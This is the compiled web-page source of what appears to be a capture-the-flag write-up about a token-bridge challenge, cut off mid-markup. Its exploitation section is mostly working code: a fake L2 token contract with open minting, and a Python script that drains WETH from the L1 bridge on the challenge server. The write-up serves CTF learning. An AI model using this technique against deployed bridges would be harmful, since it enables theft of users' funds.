operator\",children:\"=\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"            abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token method function property-access\",children:\"encodeWithSelector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"IL2ERC20Bridge\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"finalizeDeposit\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(a.span,{className:\"token property-access\",children:\"selector\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"sendCrossDomainMessage\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l2TokenBridge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" message\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    deposits\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" deposits\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"_l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"+\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    emit \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"ERC20DepositInitiated\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _l2Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _from\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(a.p,{children:[\"Since \",(0,n.jsx)(a.code,{children:\"deposits[weth][L2_WETH]\"}),\" already has a value, we can drain WETH in l1Bridge with \",(0,n.jsx)(a.code,{children:\"L2_WETH\"}),\" and custom \",(0,n.jsx)(a.code,{children:\"_l2Token\"}),\".\"]}),`\n`,(0,n.jsxs)(a.h3,{id:\"exploitation\",children:[(0,n.jsx)(a.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation\",children:(0,n.jsx)(a.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,n.jsx)(a.pre,{className:\"language-js\",children:(0,n.jsxs)(a.code,{className:\"language-js code-highlight\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"contract \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"FakeL2StandardERC20\"}),\" is \",(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"L2StandardERC20\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token function\",children:\"constructor\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"address _l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:(0,n.jsx)(a.span,{className:\"token maybe-class-name\",children:\"L2StandardERC20\"})}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_l1Token\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"FAKE\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"FAKE\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(a.span,{className:\"token function\",children:\"mint\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(a.span,{className:\"token parameter\",children:[\"address _to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" uint256 _amount\"]}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"public\"}),\" override \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(a.span,{className:\"token function\",children:\"_mint\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"_to\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _amount\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsx)(a.pre,{className:\"language-py\",children:(0,n.jsxs)(a.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"from\"}),\" cheb3 \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"import\"}),` Connection\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token keyword\",children:\"from\"}),\" cheb3\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"utils \",(0,n.jsx)(a.span,{className:\"token keyword\",children:\"import\"}),` load_compiled\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"fake_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" fake_bin \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" load_compiled\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:\"'L2StandardERC20.sol'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:\"'FakeL2StandardERC20'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"challenge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _ \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" load_compiled\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:\"'Challenge.sol'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"weth_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _ \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" load_compiled\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:\"'WETH.sol'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1bridge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _ \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" load_compiled\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:\"'L1ERC20Bridge.sol'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2bridge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" _ \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" load_compiled\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:\"'L2ERC20Bridge.sol'\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"L2_ERC20_BRIDGE \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"0x420000000000000000000000000000000000baBe\"'}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"L2_WETH \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000\"'}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"AMOUNT \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token number\",children:\"2e18\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"HOST \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"47.251.56.125\"'}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"PORT \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token number\",children:\"1337\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"TOKEN \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'\"<team-token>\"'}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"remote\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"HOST\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" PORT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"token?\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" TOKEN\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"action?\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'b\"1\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvuntil\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"rpc endpoints:\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" Connection\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvline_contains\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"l1\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"replace\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"-\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'b\"\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"strip\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2 \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" Connection\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvline_contains\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"l2\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"replace\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"-\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(a.span,{className:\"token string\",children:'b\"\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"strip\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"priv \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvline_contains\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"private\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\":\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"strip\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"challenge_addr \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvline_contains\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\"challenge\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token string\",children:'b\":\"'}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"strip\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"svr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1account \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l1\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"priv\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l2account \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"priv\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"challenge \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l1\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"challenge_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"challenge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"weth_addr \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" challenge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"caller\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"WETH\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1bridge_addr \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" challenge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"caller\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"BRIDGE\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token comment\",children:\"# deploy the custom token\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"fake \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l2\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l2account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"fake_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" bytecode\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"fake_bin\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"fake\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"deploy\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"weth_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token comment\",children:\"# obtain L2_WETH and increase deposits[weth][fake]\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"weth \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l1\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"weth_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"weth_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"weth\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"deposit\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"value\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"weth\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"approve\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1bridge_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1bridge \",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" l1\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"contract\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l1account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" address\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"l1bridge_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" abi\",(0,n.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"l1bridge_abi\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"l1bridge\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"depositERC20\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"weth_addr\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" fake\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[(0,n.jsx)(a.span,{className:\"token comment\",children:\"# withdraw\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"fake\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"functions\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"mint\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"l2account\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" AMOUNT\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"send_transaction\",(0,n.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(a.span,{className:\"code-line\",children:[\"fake\",(0,n.jsx)(a.span,{className:\"token 